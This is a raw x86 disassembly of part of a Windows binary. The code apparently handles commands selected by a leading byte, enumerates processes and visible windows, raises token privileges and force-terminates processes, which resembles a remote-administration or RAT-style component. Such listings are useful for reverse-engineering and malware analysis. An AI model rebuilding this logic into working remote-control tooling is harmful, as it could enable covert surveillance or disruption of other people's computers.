  408ea0:	c7 01 e4 b4 40 00    	movl   $0x40b4e4,(%ecx)
  408ea6:	e9 c5 d0 ff ff       	jmp    0x405f70
  408eab:	90                   	nop
  408eac:	90                   	nop
  408ead:	90                   	nop
  408eae:	90                   	nop
  408eaf:	90                   	nop
  408eb0:	56                   	push   %esi
  408eb1:	8b f1                	mov    %ecx,%esi
  408eb3:	e8 18 0a 00 00       	call   0x4098d0
  408eb8:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  408ebc:	33 c0                	xor    %eax,%eax
  408ebe:	8a 01                	mov    (%ecx),%al
  408ec0:	83 c0 dc             	add    $0xffffffdc,%eax
  408ec3:	83 f8 03             	cmp    $0x3,%eax
  408ec6:	77 37                	ja     0x408eff
  408ec8:	ff 24 85 04 8f 40 00 	jmp    *0x408f04(,%eax,4)
  408ecf:	8b ce                	mov    %esi,%ecx
  408ed1:	e8 4a 00 00 00       	call   0x408f20
  408ed6:	5e                   	pop    %esi
  408ed7:	c2 08 00             	ret    $0x8
  408eda:	8b ce                	mov    %esi,%ecx
  408edc:	e8 6f 00 00 00       	call   0x408f50
  408ee1:	5e                   	pop    %esi
  408ee2:	c2 08 00             	ret    $0x8
  408ee5:	8b ce                	mov    %esi,%ecx
  408ee7:	e8 94 00 00 00       	call   0x408f80
  408eec:	5e                   	pop    %esi
  408eed:	c2 08 00             	ret    $0x8
  408ef0:	8b 44 24 0c          	mov    0xc(%esp),%eax
  408ef4:	48                   	dec    %eax
  408ef5:	41                   	inc    %ecx
  408ef6:	50                   	push   %eax
  408ef7:	51                   	push   %ecx
  408ef8:	8b ce                	mov    %esi,%ecx
  408efa:	e8 b1 01 00 00       	call   0x4090b0
  408eff:	5e                   	pop    %esi
  408f00:	c2 08 00             	ret    $0x8
  408f03:	90                   	nop
  408f04:	cf                   	iret
  408f05:	8e 40 00             	mov    0x0(%eax),%es
  408f08:	da 8e 40 00 e5 8e    	fimull -0x711affc0(%esi)
  408f0e:	40                   	inc    %eax
  408f0f:	00 f0                	add    %dh,%al
  408f11:	8e 40 00             	mov    0x0(%eax),%es
  408f14:	90                   	nop
  408f15:	90                   	nop
  408f16:	90                   	nop
  408f17:	90                   	nop
  408f18:	90                   	nop
  408f19:	90                   	nop
  408f1a:	90                   	nop
  408f1b:	90                   	nop
  408f1c:	90                   	nop
  408f1d:	90                   	nop
  408f1e:	90                   	nop
  408f1f:	90                   	nop
  408f20:	56                   	push   %esi
  408f21:	57                   	push   %edi
  408f22:	8b f9                	mov    %ecx,%edi
  408f24:	e8 17 02 00 00       	call   0x409140
  408f29:	8b f0                	mov    %eax,%esi
  408f2b:	85 f6                	test   %esi,%esi
  408f2d:	74 17                	je     0x408f46
  408f2f:	56                   	push   %esi
  408f30:	ff 15 bc b1 40 00    	call   *0x40b1bc
  408f36:	50                   	push   %eax
  408f37:	56                   	push   %esi
  408f38:	8b cf                	mov    %edi,%ecx
  408f3a:	e8 61 d0 ff ff       	call   0x405fa0
  408f3f:	56                   	push   %esi
  408f40:	ff 15 24 b1 40 00    	call   *0x40b124
  408f46:	5f                   	pop    %edi
  408f47:	5e                   	pop    %esi
  408f48:	c3                   	ret
  408f49:	90                   	nop
  408f4a:	90                   	nop
  408f4b:	90                   	nop
  408f4c:	90                   	nop
  408f4d:	90                   	nop
  408f4e:	90                   	nop
  408f4f:	90                   	nop
  408f50:	56                   	push   %esi
  408f51:	57                   	push   %edi
  408f52:	8b f9                	mov    %ecx,%edi
  408f54:	e8 67 05 00 00       	call   0x4094c0
  408f59:	8b f0                	mov    %eax,%esi
  408f5b:	85 f6                	test   %esi,%esi
  408f5d:	74 17                	je     0x408f76
  408f5f:	56                   	push   %esi
  408f60:	ff 15 bc b1 40 00    	call   *0x40b1bc
  408f66:	50                   	push   %eax
  408f67:	56                   	push   %esi
  408f68:	8b cf                	mov    %edi,%ecx
  408f6a:	e8 31 d0 ff ff       	call   0x405fa0
  408f6f:	56                   	push   %esi
  408f70:	ff 15 24 b1 40 00    	call   *0x40b124
  408f76:	5f                   	pop    %edi
  408f77:	5e                   	pop    %esi
  408f78:	c3                   	ret
  408f79:	90                   	nop
  408f7a:	90                   	nop
  408f7b:	90                   	nop
  408f7c:	90                   	nop
  408f7d:	90                   	nop
  408f7e:	90                   	nop
  408f7f:	90                   	nop
  408f80:	6a ff                	push   $0xffffffff
  408f82:	68 88 ad 40 00       	push   $0x40ad88
  408f87:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  408f8d:	50                   	push   %eax
  408f8e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  408f95:	83 ec 30             	sub    $0x30,%esp
  408f98:	53                   	push   %ebx
  408f99:	55                   	push   %ebp
  408f9a:	89 4c 24 14          	mov    %ecx,0x14(%esp)
  408f9e:	56                   	push   %esi
  408f9f:	57                   	push   %edi
  408fa0:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  408fa4:	e8 67 94 ff ff       	call   0x402410
  408fa9:	8b 44 24 24          	mov    0x24(%esp),%eax
  408fad:	33 ed                	xor    %ebp,%ebp
  408faf:	33 f6                	xor    %esi,%esi
  408fb1:	3b c5                	cmp    %ebp,%eax
  408fb3:	89 6c 24 48          	mov    %ebp,0x48(%esp)
  408fb7:	7e 2b                	jle    0x408fe4
  408fb9:	8b 44 24 38          	mov    0x38(%esp),%eax
  408fbd:	bb 06 00 00 00       	mov    $0x6,%ebx
  408fc2:	8b 04 a8             	mov    (%eax,%ebp,4),%eax
  408fc5:	8d 78 04             	lea    0x4(%eax),%edi
  408fc8:	8b 07                	mov    (%edi),%eax
  408fca:	50                   	push   %eax
  408fcb:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  408fd1:	83 c7 04             	add    $0x4,%edi
  408fd4:	4b                   	dec    %ebx
  408fd5:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  408fd9:	75 ed                	jne    0x408fc8
  408fdb:	8b 44 24 24          	mov    0x24(%esp),%eax
  408fdf:	45                   	inc    %ebp
  408fe0:	3b e8                	cmp    %eax,%ebp
  408fe2:	7c d5                	jl     0x408fb9
  408fe4:	46                   	inc    %esi
  408fe5:	56                   	push   %esi
  408fe6:	6a 40                	push   $0x40
  408fe8:	ff 15 34 b1 40 00    	call   *0x40b134
  408fee:	8b f8                	mov    %eax,%edi
  408ff0:	8b 44 24 24          	mov    0x24(%esp),%eax
  408ff4:	85 c0                	test   %eax,%eax
  408ff6:	89 7c 24 14          	mov    %edi,0x14(%esp)
  408ffa:	bd 01 00 00 00       	mov    $0x1,%ebp
  408fff:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  409006:	00 
  409007:	7e 5f                	jle    0x409068
  409009:	8b 4c 24 38          	mov    0x38(%esp),%ecx
  40900d:	8b 54 24 10          	mov    0x10(%esp),%edx
  409011:	c7 44 24 18 06 00 00 	movl   $0x6,0x18(%esp)
  409018:	00 
  409019:	8b 1c 91             	mov    (%ecx,%edx,4),%ebx
  40901c:	83 c3 04             	add    $0x4,%ebx
  40901f:	eb 04                	jmp    0x409025
  409021:	8b 7c 24 14          	mov    0x14(%esp),%edi
  409025:	8b 03                	mov    (%ebx),%eax
  409027:	50                   	push   %eax
  409028:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  40902e:	8b 33                	mov    (%ebx),%esi
  409030:	40                   	inc    %eax
  409031:	8b c8                	mov    %eax,%ecx
  409033:	03 fd                	add    %ebp,%edi
  409035:	8b d1                	mov    %ecx,%edx
  409037:	03 e8                	add    %eax,%ebp
  409039:	c1 e9 02             	shr    $0x2,%ecx
  40903c:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40903e:	8b 44 24 18          	mov    0x18(%esp),%eax
  409042:	8b ca                	mov    %edx,%ecx
  409044:	83 e1 03             	and    $0x3,%ecx
  409047:	83 c3 04             	add    $0x4,%ebx
  40904a:	48                   	dec    %eax
  40904b:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  40904d:	89 44 24 18          	mov    %eax,0x18(%esp)
  409051:	75 ce                	jne    0x409021
  409053:	8b 44 24 10          	mov    0x10(%esp),%eax
  409057:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  40905b:	8b 7c 24 14          	mov    0x14(%esp),%edi
  40905f:	40                   	inc    %eax
  409060:	3b c1                	cmp    %ecx,%eax
  409062:	89 44 24 10          	mov    %eax,0x10(%esp)
  409066:	7c a1                	jl     0x409009
  409068:	57                   	push   %edi
  409069:	c6 07 7f             	movb   $0x7f,(%edi)
  40906c:	ff 15 bc b1 40 00    	call   *0x40b1bc
  409072:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  409076:	50                   	push   %eax
  409077:	57                   	push   %edi
  409078:	e8 23 cf ff ff       	call   0x405fa0
  40907d:	57                   	push   %edi
  40907e:	ff 15 24 b1 40 00    	call   *0x40b124
  409084:	8d 4c 24 20          	lea    0x20(%esp),%ecx
  409088:	c7 44 24 48 ff ff ff 	movl   $0xffffffff,0x48(%esp)
  40908f:	ff 
  409090:	e8 fb 93 ff ff       	call   0x402490
  409095:	8b 4c 24 40          	mov    0x40(%esp),%ecx
  409099:	5f                   	pop    %edi
  40909a:	5e                   	pop    %esi
  40909b:	5d                   	pop    %ebp
  40909c:	5b                   	pop    %ebx
  40909d:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4090a4:	83 c4 3c             	add    $0x3c,%esp
  4090a7:	c3                   	ret
  4090a8:	90                   	nop
  4090a9:	90                   	nop
  4090aa:	90                   	nop
  4090ab:	90                   	nop
  4090ac:	90                   	nop
  4090ad:	90                   	nop
  4090ae:	90                   	nop
  4090af:	90                   	nop
  4090b0:	51                   	push   %ecx
  4090b1:	53                   	push   %ebx
  4090b2:	56                   	push   %esi
  4090b3:	57                   	push   %edi
  4090b4:	8b f9                	mov    %ecx,%edi
  4090b6:	6a 01                	push   $0x1
  4090b8:	68 88 e2 40 00       	push   $0x40e288
  4090bd:	89 7c 24 14          	mov    %edi,0x14(%esp)
  4090c1:	e8 6a 02 00 00       	call   0x409330
  4090c6:	8b 5c 24 20          	mov    0x20(%esp),%ebx
  4090ca:	83 c4 08             	add    $0x8,%esp
  4090cd:	33 f6                	xor    %esi,%esi
  4090cf:	85 db                	test   %ebx,%ebx
  4090d1:	76 34                	jbe    0x409107
  4090d3:	55                   	push   %ebp
  4090d4:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  4090d8:	8b 04 2e             	mov    (%esi,%ebp,1),%eax
  4090db:	50                   	push   %eax
  4090dc:	6a 00                	push   $0x0
  4090de:	68 ff 0f 1f 00       	push   $0x1f0fff
  4090e3:	ff 15 6c b1 40 00    	call   *0x40b16c
  4090e9:	8b f8                	mov    %eax,%edi
  4090eb:	6a 00                	push   $0x0
  4090ed:	57                   	push   %edi
  4090ee:	ff 15 a0 b1 40 00    	call   *0x40b1a0
  4090f4:	57                   	push   %edi
  4090f5:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  4090fb:	83 c6 04             	add    $0x4,%esi
  4090fe:	3b f3                	cmp    %ebx,%esi
  409100:	72 d6                	jb     0x4090d8
  409102:	8b 7c 24 10          	mov    0x10(%esp),%edi
  409106:	5d                   	pop    %ebp
  409107:	6a 00                	push   $0x0
  409109:	68 88 e2 40 00       	push   $0x40e288
  40910e:	e8 1d 02 00 00       	call   0x409330
  409113:	83 c4 08             	add    $0x8,%esp
  409116:	6a 64                	push   $0x64
  409118:	ff 15 c4 b0 40 00    	call   *0x40b0c4
  40911e:	8b cf                	mov    %edi,%ecx
  409120:	e8 fb fd ff ff       	call   0x408f20
  409125:	8b cf                	mov    %edi,%ecx
  409127:	e8 24 fe ff ff       	call   0x408f50
  40912c:	5f                   	pop    %edi
  40912d:	5e                   	pop    %esi
  40912e:	5b                   	pop    %ebx
  40912f:	59                   	pop    %ecx
  409130:	c2 08 00             	ret    $0x8
  409133:	90                   	nop
  409134:	90                   	nop
  409135:	90                   	nop
  409136:	90                   	nop
  409137:	90                   	nop
  409138:	90                   	nop
  409139:	90                   	nop
  40913a:	90                   	nop
  40913b:	90                   	nop
  40913c:	90                   	nop
  40913d:	90                   	nop
  40913e:	90                   	nop
  40913f:	90                   	nop
  409140:	81 ec 38 02 00 00    	sub    $0x238,%esp
  409146:	56                   	push   %esi
  409147:	57                   	push   %edi
  409148:	33 f6                	xor    %esi,%esi
  40914a:	b9 49 00 00 00       	mov    $0x49,%ecx
  40914f:	33 c0                	xor    %eax,%eax
  409151:	8d 7c 24 18          	lea    0x18(%esp),%edi
  409155:	89 74 24 14          	mov    %esi,0x14(%esp)
  409159:	88 84 24 3c 01 00 00 	mov    %al,0x13c(%esp)
  409160:	f3 ab                	rep stos %eax,%es:(%edi)
  409162:	b9 40 00 00 00       	mov    $0x40,%ecx
  409167:	8d bc 24 3d 01 00 00 	lea    0x13d(%esp),%edi
  40916e:	f3 ab                	rep stos %eax,%es:(%edi)
  409170:	66 ab                	stos   %ax,%es:(%edi)
  409172:	6a 01                	push   $0x1
  409174:	68 88 e2 40 00       	push   $0x40e288
  409179:	89 74 24 10          	mov    %esi,0x10(%esp)
  40917d:	aa                   	stos   %al,%es:(%edi)
  40917e:	e8 ad 01 00 00       	call   0x409330
  409183:	83 c4 08             	add    $0x8,%esp
  409186:	56                   	push   %esi
  409187:	6a 02                	push   $0x2
  409189:	e8 9a 17 00 00       	call   0x40a928
  40918e:	8b f8                	mov    %eax,%edi
  409190:	83 ff ff             	cmp    $0xffffffff,%edi
  409193:	89 7c 24 0c          	mov    %edi,0xc(%esp)
  409197:	75 0b                	jne    0x4091a4
  409199:	5f                   	pop    %edi
  40919a:	33 c0                	xor    %eax,%eax
  40919c:	5e                   	pop    %esi
  40919d:	81 c4 38 02 00 00    	add    $0x238,%esp
  4091a3:	c3                   	ret
  4091a4:	53                   	push   %ebx
  4091a5:	55                   	push   %ebp
  4091a6:	68 00 04 00 00       	push   $0x400
  4091ab:	6a 40                	push   $0x40
  4091ad:	c7 44 24 24 28 01 00 	movl   $0x128,0x24(%esp)
  4091b4:	00 
  4091b5:	ff 15 34 b1 40 00    	call   *0x40b134
  4091bb:	8b e8                	mov    %eax,%ebp
  4091bd:	8d 44 24 1c          	lea    0x1c(%esp),%eax
  4091c1:	50                   	push   %eax
  4091c2:	57                   	push   %edi
  4091c3:	c6 45 00 7d          	movb   $0x7d,0x0(%ebp)
  4091c7:	bb 01 00 00 00       	mov    $0x1,%ebx
  4091cc:	e8 51 17 00 00       	call   0x40a922
  4091d1:	85 c0                	test   %eax,%eax
  4091d3:	0f 84 1a 01 00 00    	je     0x4092f3
  4091d9:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  4091dd:	51                   	push   %ecx
  4091de:	6a 00                	push   $0x0
  4091e0:	68 10 04 00 00       	push   $0x410
  4091e5:	ff 15 6c b1 40 00    	call   *0x40b16c
  4091eb:	8b f0                	mov    %eax,%esi
  4091ed:	8b 44 24 24          	mov    0x24(%esp),%eax
  4091f1:	85 c0                	test   %eax,%eax
  4091f3:	0f 84 e7 00 00 00    	je     0x4092e0
  4091f9:	83 f8 04             	cmp    $0x4,%eax
  4091fc:	0f 84 de 00 00 00    	je     0x4092e0
  409202:	83 f8 08             	cmp    $0x8,%eax
  409205:	0f 84 d5 00 00 00    	je     0x4092e0
  40920b:	8d 54 24 18          	lea    0x18(%esp),%edx
  40920f:	8d 44 24 10          	lea    0x10(%esp),%eax
  409213:	52                   	push   %edx
  409214:	6a 04                	push   $0x4
  409216:	50                   	push   %eax
  409217:	56                   	push   %esi
  409218:	e8 6f 17 00 00       	call   0x40a98c
  40921d:	8b 54 24 10          	mov    0x10(%esp),%edx
  409221:	8d 8c 24 44 01 00 00 	lea    0x144(%esp),%ecx
  409228:	68 04 01 00 00       	push   $0x104
  40922d:	51                   	push   %ecx
  40922e:	52                   	push   %edx
  40922f:	56                   	push   %esi
  409230:	e8 51 17 00 00       	call   0x40a986
  409235:	8b 3d c8 b0 40 00    	mov    0x40b0c8,%edi
  40923b:	8d 44 24 40          	lea    0x40(%esp),%eax
  40923f:	50                   	push   %eax
  409240:	ff d7                	call   *%edi
  409242:	8d 8c 24 44 01 00 00 	lea    0x144(%esp),%ecx
  409249:	8b f0                	mov    %eax,%esi
  40924b:	51                   	push   %ecx
  40924c:	ff d7                	call   *%edi
  40924e:	8d 74 06 06          	lea    0x6(%esi,%eax,1),%esi
  409252:	55                   	push   %ebp
  409253:	03 f3                	add    %ebx,%esi
  409255:	ff 15 bc b1 40 00    	call   *0x40b1bc
  40925b:	3b c6                	cmp    %esi,%eax
  40925d:	73 0c                	jae    0x40926b
  40925f:	6a 42                	push   $0x42
  409261:	56                   	push   %esi
  409262:	55                   	push   %ebp
  409263:	ff 15 2c b1 40 00    	call   *0x40b12c
  409269:	8b e8                	mov    %eax,%ebp
  40926b:	8b 54 24 24          	mov    0x24(%esp),%edx
  40926f:	8d 44 24 40          	lea    0x40(%esp),%eax
  409273:	89 14 2b             	mov    %edx,(%ebx,%ebp,1)
  409276:	50                   	push   %eax
  409277:	83 c3 04             	add    $0x4,%ebx
  40927a:	ff d7                	call   *%edi
  40927c:	8b c8                	mov    %eax,%ecx
  40927e:	8d 74 24 40          	lea    0x40(%esp),%esi
  409282:	41                   	inc    %ecx
  409283:	8d 3c 2b             	lea    (%ebx,%ebp,1),%edi
  409286:	8b d1                	mov    %ecx,%edx
  409288:	8d 44 24 40          	lea    0x40(%esp),%eax
  40928c:	c1 e9 02             	shr    $0x2,%ecx
  40928f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  409291:	8b ca                	mov    %edx,%ecx
  409293:	50                   	push   %eax
  409294:	83 e1 03             	and    $0x3,%ecx
  409297:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  409299:	8b 35 c8 b0 40 00    	mov    0x40b0c8,%esi
  40929f:	ff d6                	call   *%esi
  4092a1:	8d 8c 24 44 01 00 00 	lea    0x144(%esp),%ecx
  4092a8:	8d 5c 03 01          	lea    0x1(%ebx,%eax,1),%ebx
  4092ac:	51                   	push   %ecx
  4092ad:	ff d6                	call   *%esi
  4092af:	8b c8                	mov    %eax,%ecx
  4092b1:	8d b4 24 44 01 00 00 	lea    0x144(%esp),%esi
  4092b8:	41                   	inc    %ecx
  4092b9:	8d 3c 2b             	lea    (%ebx,%ebp,1),%edi
  4092bc:	8b d1                	mov    %ecx,%edx
  4092be:	8d 84 24 44 01 00 00 	lea    0x144(%esp),%eax
  4092c5:	c1 e9 02             	shr    $0x2,%ecx
  4092c8:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4092ca:	8b ca                	mov    %edx,%ecx
  4092cc:	50                   	push   %eax
  4092cd:	83 e1 03             	and    $0x3,%ecx
  4092d0:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4092d2:	ff 15 c8 b0 40 00    	call   *0x40b0c8
  4092d8:	8b 7c 24 14          	mov    0x14(%esp),%edi
  4092dc:	8d 5c 03 01          	lea    0x1(%ebx,%eax,1),%ebx
  4092e0:	8d 4c 24 1c          	lea    0x1c(%esp),%ecx
  4092e4:	51                   	push   %ecx
  4092e5:	57                   	push   %edi
  4092e6:	e8 31 16 00 00       	call   0x40a91c
  4092eb:	85 c0                	test   %eax,%eax
  4092ed:	0f 85 e6 fe ff ff    	jne    0x4091d9
  4092f3:	6a 42                	push   $0x42
  4092f5:	53                   	push   %ebx
  4092f6:	55                   	push   %ebp
  4092f7:	ff 15 2c b1 40 00    	call   *0x40b12c
  4092fd:	6a 00                	push   $0x0
  4092ff:	68 88 e2 40 00       	push   $0x40e288
  409304:	8b f0                	mov    %eax,%esi
  409306:	e8 25 00 00 00       	call   0x409330
  40930b:	83 c4 08             	add    $0x8,%esp
  40930e:	57                   	push   %edi
  40930f:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  409315:	5d                   	pop    %ebp
  409316:	5b                   	pop    %ebx
  409317:	8b c6                	mov    %esi,%eax
  409319:	5f                   	pop    %edi
  40931a:	5e                   	pop    %esi
  40931b:	81 c4 38 02 00 00    	add    $0x238,%esp
  409321:	c3                   	ret
  409322:	90                   	nop
  409323:	90                   	nop
  409324:	90                   	nop
  409325:	90                   	nop
  409326:	90                   	nop
  409327:	90                   	nop
  409328:	90                   	nop
  409329:	90                   	nop
  40932a:	90                   	nop
  40932b:	90                   	nop
  40932c:	90                   	nop
  40932d:	90                   	nop
  40932e:	90                   	nop
  40932f:	90                   	nop
  409330:	83 ec 14             	sub    $0x14,%esp
  409333:	8d 44 24 00          	lea    0x0(%esp),%eax
  409337:	56                   	push   %esi
  409338:	50                   	push   %eax
  409339:	6a 28                	push   $0x28
  40933b:	be 01 00 00 00       	mov    $0x1,%esi
  409340:	ff 15 5c b1 40 00    	call   *0x40b15c
  409346:	50                   	push   %eax
  409347:	ff 15 58 b0 40 00    	call   *0x40b058
  40934d:	85 c0                	test   %eax,%eax
  40934f:	75 07                	jne    0x409358
  409351:	32 c0                	xor    %al,%al
  409353:	5e                   	pop    %esi
  409354:	83 c4 14             	add    $0x14,%esp
  409357:	c3                   	ret
  409358:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  40935c:	8b 44 24 1c          	mov    0x1c(%esp),%eax
  409360:	f7 d9                	neg    %ecx
  409362:	8d 54 24 0c          	lea    0xc(%esp),%edx
  409366:	89 74 24 08          	mov    %esi,0x8(%esp)
  40936a:	1b c9                	sbb    %ecx,%ecx
  40936c:	52                   	push   %edx
  40936d:	83 e1 02             	and    $0x2,%ecx
  409370:	50                   	push   %eax
  409371:	6a 00                	push   $0x0
  409373:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  409377:	ff 15 5c b0 40 00    	call   *0x40b05c
  40937d:	8b 54 24 04          	mov    0x4(%esp),%edx
  409381:	6a 00                	push   $0x0
  409383:	6a 00                	push   $0x0
  409385:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  409389:	6a 10                	push   $0x10
  40938b:	51                   	push   %ecx
  40938c:	6a 00                	push   $0x0
  40938e:	52                   	push   %edx
  40938f:	ff 15 60 b0 40 00    	call   *0x40b060
  409395:	ff 15 00 b1 40 00    	call   *0x40b100
  40939b:	85 c0                	test   %eax,%eax
  40939d:	74 02                	je     0x4093a1
  40939f:	33 f6                	xor    %esi,%esi
  4093a1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4093a5:	50                   	push   %eax
  4093a6:	ff 15 e4 b1 40 00    	call   *0x40b1e4
  4093ac:	33 c0                	xor    %eax,%eax
  4093ae:	85 f6                	test   %esi,%esi
  4093b0:	0f 95 c0             	setne  %al
  4093b3:	5e                   	pop    %esi
  4093b4:	83 c4 14             	add    $0x14,%esp
  4093b7:	c3                   	ret
  4093b8:	90                   	nop
  4093b9:	90                   	nop
  4093ba:	90                   	nop
  4093bb:	90                   	nop
  4093bc:	90                   	nop
  4093bd:	90                   	nop
  4093be:	90                   	nop
  4093bf:	90                   	nop
  4093c0:	6a 01                	push   $0x1
  4093c2:	68 98 e6 40 00       	push   $0x40e698
  4093c7:	e8 64 ff ff ff       	call   0x409330
  4093cc:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4093d0:	83 c4 08             	add    $0x8,%esp
  4093d3:	6a 00                	push   $0x0
  4093d5:	50                   	push   %eax
  4093d6:	ff 15 40 b3 40 00    	call   *0x40b340
  4093dc:	6a 00                	push   $0x0
  4093de:	68 98 e6 40 00       	push   $0x40e698
  4093e3:	e8 48 ff ff ff       	call   0x409330
  4093e8:	83 c4 08             	add    $0x8,%esp
  4093eb:	c3                   	ret
  4093ec:	90                   	nop
  4093ed:	90                   	nop
  4093ee:	90                   	nop
  4093ef:	90                   	nop
  4093f0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4093f4:	81 ec 00 04 00 00    	sub    $0x400,%esp
  4093fa:	b9 00 01 00 00       	mov    $0x100,%ecx
  4093ff:	53                   	push   %ebx
  409400:	8b 18                	mov    (%eax),%ebx
  409402:	55                   	push   %ebp
  409403:	56                   	push   %esi
  409404:	8b b4 24 10 04 00 00 	mov    0x410(%esp),%esi
  40940b:	57                   	push   %edi
  40940c:	33 c0                	xor    %eax,%eax
  40940e:	8d 7c 24 10          	lea    0x10(%esp),%edi
  409412:	f3 ab                	rep stos %eax,%es:(%edi)
  409414:	8d 4c 24 10          	lea    0x10(%esp),%ecx
  409418:	68 00 04 00 00       	push   $0x400
  40941d:	51                   	push   %ecx
  40941e:	56                   	push   %esi
  40941f:	ff 15 84 b3 40 00    	call   *0x40b384
  409425:	56                   	push   %esi
  409426:	ff 15 38 b3 40 00    	call   *0x40b338
  40942c:	85 c0                	test   %eax,%eax
  40942e:	74 7e                	je     0x4094ae
  409430:	8b 2d c8 b0 40 00    	mov    0x40b0c8,%ebp
  409436:	8d 54 24 10          	lea    0x10(%esp),%edx
  40943a:	52                   	push   %edx
  40943b:	ff d5                	call   *%ebp
  40943d:	85 c0                	test   %eax,%eax
  40943f:	74 6d                	je     0x4094ae
  409441:	85 db                	test   %ebx,%ebx
  409443:	75 0c                	jne    0x409451
  409445:	6a 01                	push   $0x1
  409447:	6a 40                	push   $0x40
  409449:	ff 15 34 b1 40 00    	call   *0x40b134
  40944f:	8b d8                	mov    %eax,%ebx
  409451:	8d 44 24 10          	lea    0x10(%esp),%eax
  409455:	50                   	push   %eax
  409456:	ff d5                	call   *%ebp
  409458:	8b f0                	mov    %eax,%esi
  40945a:	53                   	push   %ebx
  40945b:	83 c6 05             	add    $0x5,%esi
  40945e:	ff 15 bc b1 40 00    	call   *0x40b1bc
  409464:	8b f8                	mov    %eax,%edi
  409466:	6a 42                	push   $0x42
  409468:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  40946b:	51                   	push   %ecx
  40946c:	53                   	push   %ebx
  40946d:	ff 15 2c b1 40 00    	call   *0x40b12c
  409473:	8b d8                	mov    %eax,%ebx
  409475:	8b 94 24 14 04 00 00 	mov    0x414(%esp),%edx
  40947c:	03 fb                	add    %ebx,%edi
  40947e:	57                   	push   %edi
  40947f:	52                   	push   %edx
  409480:	ff 15 3c b3 40 00    	call   *0x40b33c
  409486:	8d 44 24 10          	lea    0x10(%esp),%eax
  40948a:	50                   	push   %eax
  40948b:	ff d5                	call   *%ebp
  40948d:	8b c8                	mov    %eax,%ecx
  40948f:	8d 74 24 10          	lea    0x10(%esp),%esi
  409493:	41                   	inc    %ecx
  409494:	83 c7 04             	add    $0x4,%edi
  409497:	8b d1                	mov    %ecx,%edx
  409499:	8b 84 24 18 04 00 00 	mov    0x418(%esp),%eax
  4094a0:	c1 e9 02             	shr    $0x2,%ecx
  4094a3:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4094a5:	8b ca                	mov    %edx,%ecx
  4094a7:	83 e1 03             	and    $0x3,%ecx
  4094aa:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  4094ac:	89 18                	mov    %ebx,(%eax)
  4094ae:	5f                   	pop    %edi
  4094af:	5e                   	pop    %esi
  4094b0:	5d                   	pop    %ebp
  4094b1:	b0 01                	mov    $0x1,%al
  4094b3:	5b                   	pop    %ebx
  4094b4:	81 c4 00 04 00 00    	add    $0x400,%esp
  4094ba:	c2 08 00             	ret    $0x8
  4094bd:	90                   	nop
  4094be:	90                   	nop
  4094bf:	90                   	nop
  4094c0:	51                   	push   %ecx
  4094c1:	8d 44 24 00          	lea    0x0(%esp),%eax
  4094c5:	c7 44 24 00 00 00 00 	movl   $0x0,0x0(%esp)
  4094cc:	00 
  4094cd:	50                   	push   %eax
  4094ce:	68 f0 93 40 00       	push   $0x4093f0
  4094d3:	ff 15 34 b3 40 00    	call   *0x40b334
  4094d9:	8b 4c 24 00          	mov    0x0(%esp),%ecx
  4094dd:	c6 01 7e             	movb   $0x7e,(%ecx)
  4094e0:	8b 44 24 00          	mov    0x0(%esp),%eax
  4094e4:	59                   	pop    %ecx
  4094e5:	c3                   	ret
  4094e6:	90                   	nop
  4094e7:	90                   	nop
  4094e8:	90                   	nop
  4094e9:	90                   	nop
  4094ea:	90                   	nop
  4094eb:	90                   	nop
  4094ec:	90                   	nop
  4094ed:	90                   	nop
  4094ee:	90                   	nop
  4094ef:	90                   	nop
  4094f0:	55                   	push   %ebp
  4094f1:	8b ec                	mov    %esp,%ebp
  4094f3:	6a ff                	push   $0xffffffff
  4094f5:	68 a0 ad 40 00       	push   $0x40ada0
  4094fa:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  409500:	50                   	push   %eax
  409501:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  409508:	83 ec 08             	sub    $0x8,%esp
  40950b:	33 c0                	xor    %eax,%eax
  40950d:	53                   	push   %ebx
  40950e:	89 45 ec             	mov    %eax,-0x14(%ebp)
  409511:	89 45 fc             	mov    %eax,-0x4(%ebp)
  409514:	8b 45 08             	mov    0x8(%ebp),%eax
  409517:	56                   	push   %esi
  409518:	57                   	push   %edi
  409519:	8b 30                	mov    (%eax),%esi
  40951b:	89 65 f0             	mov    %esp,-0x10(%ebp)
  40951e:	8b 78 04             	mov    0x4(%eax),%edi
  409521:	8b 58 08             	mov    0x8(%eax),%ebx
  409524:	8b 40 0c             	mov    0xc(%eax),%eax
  409527:	50                   	push   %eax
  409528:	ff 15 d8 b1 40 00    	call   *0x40b1d8
  40952e:	84 db                	test   %bl,%bl
  409530:	74 0a                	je     0x40953c
  409532:	6a 00                	push   $0x0
  409534:	e8 d7 04 00 00       	call   0x409a10
  409539:	83 c4 04             	add    $0x4,%esp
  40953c:	57                   	push   %edi
  40953d:	ff d6                	call   *%esi
  40953f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  409542:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
